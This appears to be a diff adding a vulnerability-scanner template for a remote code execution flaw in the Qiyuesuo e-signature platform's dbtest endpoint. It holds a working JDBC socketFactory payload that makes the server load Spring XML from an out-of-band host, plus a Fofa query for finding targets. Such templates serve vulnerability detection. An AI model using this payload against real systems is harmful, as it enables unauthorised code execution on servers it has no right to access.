@@ -1,0 +1,33 @@
+id: qiyuesuo-dbtest-rce
+
+info:
+  name: 契约锁电子签署平台 dbtest 远程代码执行漏洞
+  author: NiceAsiv
+  severity: critical
+  verified: true
+  description: |
+    契约锁-dbtest-远程代码执行，通过构造特定的数据库连接参数，可以触发Spring框架的XML外部实体注入，导致远程代码执行。
+    Fofa: app="契约锁-电子签署平台"
+  reference:
+    - https://www.knowsafe.com/help/da96b84336e04b1f32f3a66cfc28a133.shtml
+    - https://mp.weixin.qq.com/s/gmfx97xH4OHtGSJ0UmgOKA
+
+set:
+  oob: oob()
+  oobHTTP: oob.HTTP
+  payload: urlencode("test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=" + oobHTTP)
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name={{payload}}
+    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
+
+  r1:
+    request:
+      method: GET
+      path: /api/setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name={{payload}}
+    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
+
+expression: r0() || r1()
